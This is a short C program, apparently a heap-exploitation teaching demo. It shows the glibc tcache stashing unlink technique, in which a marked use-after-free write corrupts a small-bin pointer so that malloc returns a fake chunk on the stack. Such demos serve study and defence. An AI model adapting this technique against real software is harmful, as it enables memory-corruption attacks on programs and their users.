
#include <stdlib.h>
#include <assert.h>
int main()
{
    unsigned long stack_var[0x10] = { 0 };
    unsigned long *chunk_lis[0x10] = { 0 };
    unsigned long *target;
    // stack_var emulate the fake_chunk we want to alloc to
    stack_var[3] = (unsigned long)(&stack_var[2]);
    stack_var[4] = 0; // we'll write a libc addr here
    //now we malloc 9 chunks
    for (int i = 0;i < 9;i++) {
        chunk_lis[i] = (unsigned long *)malloc(0x90);
    }
    //put 7 chunks into tcache
    for (int i = 3;i < 9;i++) {
        free(chunk_lis[i]);
    }
    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);
    //convert into small bin
    malloc(0xa0);// size > 0x90
    //now 5 tcache bins
    malloc(0x90);
    malloc(0x90);
    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/
    //trigger the attack
    calloc(1, 0x90);
    //malloc and return our fake chunk on stack
    target = malloc(0x90);
    assert(target == &stack_var[2]);
    assert(stack_var[4] != 0);
    return 0;
}
